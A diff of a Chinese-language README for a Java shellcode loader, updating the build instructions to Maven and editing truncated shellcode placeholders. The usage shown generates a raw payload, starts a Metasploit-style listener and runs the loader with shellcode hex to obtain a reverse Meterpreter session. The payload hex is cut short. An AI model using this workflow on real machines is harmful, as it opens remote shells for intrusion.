@@ -10,9 +10,7 @@
 
 ## 编译
 
-当前版本使用的jna经过魔改，不支持maven编译。
-
-需要使用idea的构建工件功能进行打包，具体方法请咨询百度。
+maven package
 
 ## 使用
 
@@ -42,7 +40,7 @@ java -jar ShellcodeLoader.jar --x64 shellcode_hex
 No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of hex file: 708 bytes
-fce88f0000006089e531d2648b5xxxx
+fce88f0000006089e531d2648b5....
 ```
 
 然后开启监听
@@ -59,7 +57,7 @@ exploit -j
 ### 客户端
 
 ```
-java -jar ShellcodeLoader.jar fce88f0000006089e531d2648b5xxxx
+java -jar ShellcodeLoader.jar fce88f0000006089e531d2648b5....
 ```
 
 即可收到反弹的Meterpreter
